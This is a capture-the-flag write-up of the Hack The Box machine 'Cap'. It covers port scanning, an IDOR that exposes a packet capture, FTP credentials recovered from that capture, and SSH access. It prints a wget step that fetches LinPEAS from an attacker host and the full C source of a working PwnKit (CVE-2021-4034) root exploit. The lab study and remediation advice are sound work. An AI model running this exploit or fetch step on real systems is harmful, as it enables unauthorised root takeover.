# Cap - HTB Writeup

## Machine Information

| Information | Details |
|---|---|
| Machine | Cap |
| Platform | Hack The Box |
| Difficulty | Easy |
| OS | Linux |
| IP Address | 10.129.121.231 |

---

# 1. Enumeration

I started by performing a full TCP port scan against the target using Nmap.

```bash
sudo nmap -Pn -p- --min-rate 300 10.129.121.231
```
<img width="797" height="308" alt="nmap" src="https://github.com/user-attachments/assets/33cc6d9e-4f8c-4c32-a172-413aa68c0bca" />


The scan revealed three open TCP ports:

| Port | Service |
|---|---|
| 21/tcp | FTP |
| 22/tcp | SSH |
| 80/tcp | HTTP |

Since port 80 was open, I proceeded to enumerate the web application.

# 2. Web Enumeration

I added the target IP address to `/etc/hosts`:

```bash
sudo nano /etc/hosts
```

I added:

```text
10.129.121.231 cap.htb
```


After accessing the web application, I discovered a dashboard containing several sections:

- Dashboard
- Security Snapshot
- IP Config
- Network Status

The `Security Snapshot` functionality was particularly interesting because it provided information about network traffic and allowed the user to download a PCAP file.
<img width="1910" height="798" alt="dashboard" src="https://github.com/user-attachments/assets/9156a8bf-40ea-40d0-83e4-94cd8f76f381" />


# 3. IDOR - Security Snapshot

While testing the `Security Snapshot` functionality, I noticed that the page used an ID parameter to identify the network capture.

The page was initially accessible through:

```text
/data/1
```

I tested whether modifying the ID would allow access to other captures.

I changed the ID from:

```text
/data/1
```

to:

```text
/data/0
```

The application returned another network capture that was available for download.

<img width="1914" height="822" alt="datra0" src="https://github.com/user-attachments/assets/1c99327c-cab5-40ea-8a1c-d18827f2f7a1" />

This demonstrated an **Insecure Direct Object Reference (IDOR)** vulnerability, which falls under **Broken Access Control**.

The application failed to properly verify whether the authenticated user was authorized to access the requested network capture.

I downloaded the PCAP file and opened it using Wireshark for further analysis.
<img width="1913" height="924" alt="Screenshot 2026-09-09 075026" src="https://github.com/user-attachments/assets/4d7c8f53-72f0-4813-9adc-33011502fb10" />


# 4. PCAP Analysis

Since FTP was one of the open services discovered during enumeration, I filtered the traffic in Wireshark using:

```text
ftp
```
<img width="1917" height="873" alt="Screenshot 2026-09-09 075241" src="https://github.com/user-attachments/assets/4f7831fb-dd52-4536-85ce-6483e622f469" />


The captured traffic contained FTP authentication requests.

Because FTP transmits authentication information in plaintext, the username and password were visible directly in the captured traffic.

The relevant FTP requests contained:

```text
USER nathan
PASS Buck3tH4T4FORM3!
230 Login successful.
```
<img width="1268" height="846" alt="Screenshot 2026-09-09 075518" src="https://github.com/user-attachments/assets/2ef47d4c-72c8-4c0e-a5ba-303f755bf6ac" />


The credentials obtained were:

```text
Username: nathan
Password: Buck3tH4T4FORM3!
```

These credentials provided valid access to the `nathan` user.

# 5. Initial Access - SSH

Since SSH was open on port 22, I tested the recovered credentials against the SSH service:

```bash
ssh nathan@10.129.121.231
```

The credentials were valid, and I successfully obtained an SSH shell as the `nathan` user.
<img width="797" height="574" alt="Screenshot 2026-09-09 075748" src="https://github.com/user-attachments/assets/1ca246e6-737a-4e1e-894c-5b5b98feb8b7" />


I verified the current user:

```bash
whoami
```

The output confirmed:

```text
nathan
```

# 6. User Flag

After obtaining access as `nathan`, I retrieved the user flag:

```bash
cat user.txt
```
<img width="810" height="572" alt="Screenshot 2026-09-09 075851" src="https://github.com/user-attachments/assets/848b92dc-ddc9-4d71-bb0e-7a942a7dd480" />


# 7. Privilege Escalation Enumeration

I then moved on to privilege escalation enumeration.

First, I checked the sudo permissions available to the current user:

```bash
sudo -l
```

However, the `nathan` user did not have any useful sudo permissions that could be directly abused.

Because there was no exploitable sudo configuration, I proceeded with further local enumeration.

# 8. LinPEAS

I used LinPEAS to perform automated local privilege escalation enumeration.

First, I started a Python HTTP server on my attacking machine:

```bash
python3 -m http.server 8000
```

Then, from the target machine, I downloaded `linpeas.sh`:

```bash
wget http://<ATTACKER-IP>:8000/linpeas.sh
```

I made the script executable:

```bash
chmod +x linpeas.sh
```

Then I executed it:

```bash
./linpeas.sh
```


During the enumeration, LinPEAS identified a potentially vulnerable `pkexec` binary.

The relevant finding was:

```text
Pkexec version 0.105
Potentially vulnerable to CVE-2021-4034 (PwnKit)
```
<img width="1208" height="234" alt="Screenshot 2026-09-09 084026" src="https://github.com/user-attachments/assets/7f0c3ccf-3ea9-4492-ba1f-0106452ddd1c" />


# 9. PwnKit - CVE-2021-4034

The identified vulnerability was **CVE-2021-4034**, commonly known as **PwnKit**.

The vulnerability affects `pkexec`, a SUID-root program belonging to the Polkit framework.

The vulnerable binary was located at:

```text
/usr/bin/pkexec
```

The installed version was:

```text
0.105
```

Because `pkexec` was running with SUID privileges and the installed version was vulnerable, it provided a potential local privilege escalation path from the `nathan` user to `root`.

# 10. Exploitation

I created the exploit source code in `/tmp`:

```bash
cd /tmp
nano exploit.c
```
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    char *env[] = {
        "pwnkit",
        "PATH=GCONV_PATH=.",
        "CHARSET=PWNKIT",
        "SHELL=pwnkit",
        NULL
    };

    char *args[] = { NULL };

    system("mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'");
    system("mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules");

    FILE *f = fopen("pwnkit/pwnkit.c", "w");

    fprintf(f,
        "#include <stdio.h>\n"
        "#include <stdlib.h>\n"
        "#include <unistd.h>\n"
        "void gconv() {}\n"
        "void gconv_init() {\n"
        "setuid(0); setgid(0);\n"
        "execl(\"/bin/sh\", \"sh\", NULL);\n"
        "}\n"
    );

    fclose(f);

    system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC");

    execve("/usr/bin/pkexec", args, env);

    return 0;
}
```

I then compiled the exploit:

```bash
gcc exploit.c -o exploit
```


I executed the compiled exploit:

```bash
./exploit
```

The exploit successfully triggered CVE-2021-4034 and spawned a shell with root privileges.


After obtaining the shell, some standard commands were initially unavailable because the exploit modified the `PATH` environment variable.

I restored the default system `PATH`:

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

I then verified the current user:

```bash
whoami
```

The result was:

```text
root
```

<img width="803" height="293" alt="Screenshot 2026-09-09 085506" src="https://github.com/user-attachments/assets/34eb09b2-e687-4443-b3d6-78677d3572ba" />

This confirmed successful privilege escalation from `nathan` to `root`.

# 11. Root Flag

With root access obtained, I retrieved the root flag:

```bash
cat /root/root.txt
```

<img width="593" height="84" alt="Screenshot 2026-09-09 085641" src="https://github.com/user-attachments/assets/3e4654b9-7e3a-4b85-b5d3-61230e5c75b6" />

# 12. Attack Path Summary

The complete attack chain was:

```text
Nmap
  ↓
Open Ports: 21 FTP, 22 SSH, 80 HTTP
  ↓
Web Enumeration
  ↓
Security Snapshot
  ↓
IDOR / Broken Access Control
  ↓
Access to Another PCAP
  ↓
Wireshark
  ↓
FTP Plaintext Credentials
  ↓
SSH
  ↓
Initial Access as nathan
  ↓
LinPEAS
  ↓
CVE-2021-4034 (PwnKit)
  ↓
pkexec Exploitation
  ↓
Root Shell
  ↓
Root Flag
```

# 13. Vulnerabilities Identified

## 13.1 IDOR / Broken Access Control

The web application allowed access to another network capture by modifying the numeric ID in the URL.

The application failed to properly enforce authorization checks for the requested object.

### Impact

An attacker could potentially access network captures belonging to other users.

### Recommendation

The application should verify that the authenticated user is authorized to access the requested resource before returning the corresponding PCAP file.

## 13.2 FTP Cleartext Authentication

FTP was used without encryption, allowing usernames and passwords to be captured from network traffic.

### Impact

An attacker with access to the network traffic could recover valid credentials.

### Recommendation

FTP should be replaced with a secure alternative such as SFTP or FTPS, and sensitive credentials should never be transmitted in plaintext.

## 13.3 PwnKit - CVE-2021-4034

The system contained a vulnerable version of `pkexec` affected by CVE-2021-4034.

### Impact

A local attacker with a low-privileged account could potentially escalate privileges to root.

### Recommendation

Update Polkit and `pkexec` to a patched version and ensure security updates are regularly applied.

# 14. Flags

## User Flag

```text
[USER FLAG]
```

## Root Flag

```text
[ROOT FLAG]
```

# 15. Conclusion

The machine was compromised through a chain of vulnerabilities and misconfigurations.

The initial foothold was obtained by exploiting an IDOR vulnerability in the Security Snapshot functionality, which allowed access to another PCAP file.

The PCAP contained unencrypted FTP traffic, exposing valid credentials for the `nathan` user. These credentials were then reused to obtain SSH access.

For privilege escalation, local enumeration with LinPEAS identified a vulnerable version of `pkexec affected by CVE-2021-4034 (PwnKit). Exploiting this vulnerability resulted in a root shell and allowed retrieval of the root flag.

The complete attack chain was:

**IDOR → PCAP Exposure → FTP Credentials → SSH → LinPEAS → PwnKit → Root**
